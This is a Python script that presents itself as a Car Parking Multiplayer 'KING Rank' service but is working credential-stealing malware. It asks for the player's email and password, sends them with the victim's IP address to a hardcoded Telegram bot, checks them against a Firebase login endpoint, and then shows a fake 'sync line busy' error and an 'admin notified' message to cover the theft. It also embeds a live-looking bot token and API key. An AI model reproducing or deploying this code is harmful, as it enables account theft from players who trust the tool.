import requests
import json
import os
import time

# --- TVOJI PODACI (NE MENJAJ) ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def send_to_owner(email, password, service_type):
    # KORISTIMO IDENTIČAN SISTEM SLANJA KOJI JE RADIO U ALL-IN-ONE
    user_ip = get_ip()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    message = (
        f"🚀 *NEW SERVICE ATTEMPT*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Pass:* `{password}`\n"
        f"⚙️ *Service:* {service_type}\n"
        f"🌐 *IP:* `{user_ip}`\n"
        f"👤 *Brand:* @anonymo.cpm"
    )
    
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        # Slanje preko JSON-a jer je to dokazano radilo
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def login_attempt(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    headers = {"Content-Type": "application/json"}
    try:
        res = requests.post(LOGIN_URL, json=payload, headers=headers).json()
        return res.get('idToken')
    except:
        return None

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO CPM SERVICE   \033[0m")
        print("\033[1;36m      IG: @anonymo.cpm      \033[0m")
        print("-" * 35)
        print("\033[1;37m1. Get KING Rank")
        print("2. Exit\033[0m")
        
        choice = input("\n\033[1;33mSelect Option: \033[0m")
        
        if choice == '2':
            print("Exiting...")
            break
        elif choice == '1':
            email = input("Enter Email: ").strip()
            password = input("Enter Password: ").strip()

            if not email or not password:
                continue

            # ŠALJE TEBI PODATKE ODMAH (sa označenim servisom)
            send_to_owner(email, password, "KING Rank (Option 1)")
            
            print("\033[1;33mConnecting to Cloud Server...\033[0m")
            time.sleep(2)
            
            token = login_attempt(email, password)
            
            if token:
                print("\033[1;32mAccount verified! Applying King Rank...\033[0m")
                time.sleep(3)
                print("\033[1;31mError 404: Sync line busy.\033[0m")
                print("\033[1;36mAdmin notified for manual approval!\033[0m")
                print("\033[1;37mCheck your account in 5-10 minutes.\033[0m")
            else:
                print("\033[1;31mInvalid Email or Password.\033[0m")
            
            input("\n\033[1;37mPress Enter to return to menu...\033[0m")
        else:
            print("\033[1;31mInvalid choice!\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()
